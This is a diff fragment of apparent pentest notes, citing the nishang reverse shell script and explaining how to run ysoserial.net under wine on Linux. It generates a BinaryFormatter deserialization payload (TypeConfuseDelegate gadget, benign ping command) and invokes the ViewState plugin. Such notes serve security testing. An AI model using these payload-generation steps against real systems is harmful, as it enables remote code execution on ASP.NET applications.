@@ -11,7 +11,25 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOn
 #
 ##
 
+
 ```
+I see it is outdated a bit, but maybe it will help somebody.
+I've found easier way to run ysoserial.net on Linux.
+
+Install wine && winetricks && mono
+sudo apt install mono-complete wine winetricks -y
+Download latest release of ysoserial.net and unzip it.
+https://github.com/pwntester/ysoserial.net/releases
+unzip ysosierial.zip
+Install dotnet48 using wine
+winetricks dotnet48
+Run ysoserial.exe in wine
+wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
+
+##
+##
+##
+
 I’ll run it with --help to get a list of the parameters:
 
 PS > .\ysoserial.exe -p ViewState --help
